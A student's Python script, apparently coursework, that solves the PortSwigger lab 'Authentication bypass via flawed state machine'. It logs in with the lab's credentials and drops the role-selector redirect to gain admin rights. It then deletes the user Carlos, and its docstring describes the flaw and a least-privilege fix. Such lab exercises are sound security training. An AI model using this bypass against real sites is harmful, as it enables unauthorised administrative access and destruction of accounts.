"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Authentication bypass via flawed state machine.

Level Description:
    This lab makes flawed assumptions about the sequence of events in the login process. 
    To solve the lab, exploit this flaw to bypass the lab's authentication, 
    access the admin interface, and delete Carlos.

    You can log in to your own account using the following credentials: wiener:peter 

Vulnerability Description:
    On login, the site redirects the user from the /login page to the /role-selector
    page. If the user does not redirect and instead drops the redirect request then
    the user's role defaults to the Admin role. 

Remediation:
    An easy fix would be on the back-end during login. If the /role-selector page request is
    dropped, then the logging in user should have their role default to a role of least privilege.
"""


# We will need to include the "requests" library in order to sent GET and POST requests.
# We will need "BeautifulSoup" in order to parse HTML GET responses to get CSRF tokens for 
# form submissions in this lab.
import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = "aca81f6b1ed506118064849a0076003f.web-security-academy.net"
login_url = f"https://{site}/login"

"""
Here, we will GET the login page and extract csrf token from the html response.
Then we will use the default provided credentials for the lab, and package them into a
'login_data' object which we will then use in a POST request to login to the site.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

"""
Here, we will POST the login info, but it is critical that we do NOT allow redirects.
This will cause us to drop the /role-selector request and will cause our role to default to the
Admin role.
"""
resp = s.post(login_url, data=login_data, allow_redirects=False)
print(f"Login status response: {resp.status_code}")

"""
Now, as an admin we can GET the admin panel. We will then use BeautifulSoup to parse out the
delete link for Carlos' account. Once found, we will then send a GET request to their delete link
and solve the level.
"""
resp = s.get(f"https://{site}/admin")
print(f"Request admin panel status: {resp.status_code}")

soup = BeautifulSoup(resp.text, 'html.parser')
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
delete_uri = carlos_delete_link[0]['href']
resp = s.get(f"https://{site}{delete_uri}")
print(f"Delete Carlos' profile status: {resp.status_code}")